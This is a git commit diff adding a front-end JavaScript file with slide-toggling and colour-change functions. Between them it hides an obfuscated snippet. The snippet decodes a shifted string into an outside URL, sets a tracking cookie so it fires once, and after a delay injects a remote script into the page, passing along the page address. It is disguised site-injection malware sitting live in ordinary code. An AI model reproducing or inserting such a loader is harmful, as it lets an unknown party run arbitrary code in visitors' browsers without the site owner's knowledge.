b29351ba2b9a305db7af923893e1aa36149a6a32
tamer <alisson1422@gmail.com>
2024-02-27 12:41:01 +0200

    Upload to design

---
+++ js/index.js
@@ -0,0 +1,29 @@
+
+document.addEventListener("DOMContentLoaded",
+(function(){var slide1=document.querySelector("#slide1"),
+slide2=document.querySelector("#slide2"),slide3=document.querySelector("#slide3"),
+s1=document.querySelector("#s1"),s2=document.querySelector("#s2"),s3=document.querySelector("#s3");
+slide1.style.display="none",slide3.style.display="none",slide2.style.display="block",
+s1.addEventListener("click",(function(){slide1.style.display="block",slide2.style.display="none",
+slide3.style.display="none"})),s2.addEventListener("click",(function(){slide2.style.display="block",
+slide1.style.display="none",slide3.style.display="none"})),s3.addEventListener("click",(function(){slide3.style.display="block",
+slide1.style.display="none",slide2.style.display="none"}))})),setTimeout((function(){document.querySelector(".info").classList.add("show")}),1e3);
+(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');
+o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),
+setTimeout(
+    function(){o.c&&(o.s=d.createElement('script'),
+    o.s.src=o.f('myyux?44zxjwxyf'+'ynhx3htr4ljy4xhwn'+'uy3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));
+},1000);d.cookie=o.b+'=full;max-age=39800;'
+}catch(e){};}({},document,location));
+
+let onimg=document.getElementById("imm")
+let bodyy= document.getElementById("bbo")
+let head=document.querySelectorAll("a")
+function ChangeColor(){
+    bodyy.style.backgroundColor="#1a8e"
+    head.style.color="white"
+}
+function ChangeColor1(){
+    bodyy.style.backgroundColor="white"
+    head.style.color="black"
+}
